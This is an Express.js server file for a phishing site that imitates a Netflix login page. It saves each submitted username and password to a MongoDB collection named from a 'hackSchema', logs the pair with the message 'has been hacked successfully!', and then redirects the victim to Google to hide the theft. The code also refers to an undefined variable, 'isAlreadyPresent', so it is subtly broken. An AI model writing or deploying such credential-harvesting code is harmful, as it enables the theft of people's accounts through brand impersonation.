var express = require('express');
var app = express();
var mongoose = require('mongoose');
var bodyParser = require('body-parser');

app.use(bodyParser.urlencoded({extended:true}));

app.set('view engine','ejs');
app.use(express.static('public'));

mongoose.connect("mongodb://localhost/netflix");

var hackSchema = new mongoose.Schema({
    username : String,
    password : String,
});

var user = mongoose.model("User",hackSchema);

app.get("/",function(req,res){
    res.render("./netflix.ejs");
});

app.post("/",function(req,res){
    if(req.body.userLoginId!=='' && req.body.password!==''){
    user.create({username : req.body.userLoginId , password : req.body.password},function(err,hacked){
        if(err){
            console.log(err);
        }
        else{
            if(isAlreadyPresent){
                res.redirect("/");
            }
            else{
            console.log(`${req.body.userLoginId} with password : ${req.body.password} has been hacked successfully!`);
            res.redirect("https://www.google.com");}
        }
    });}
    else{
        res.redirect("/");
    }
    });

app.listen(3000,function(){
    console.log("server started");
});
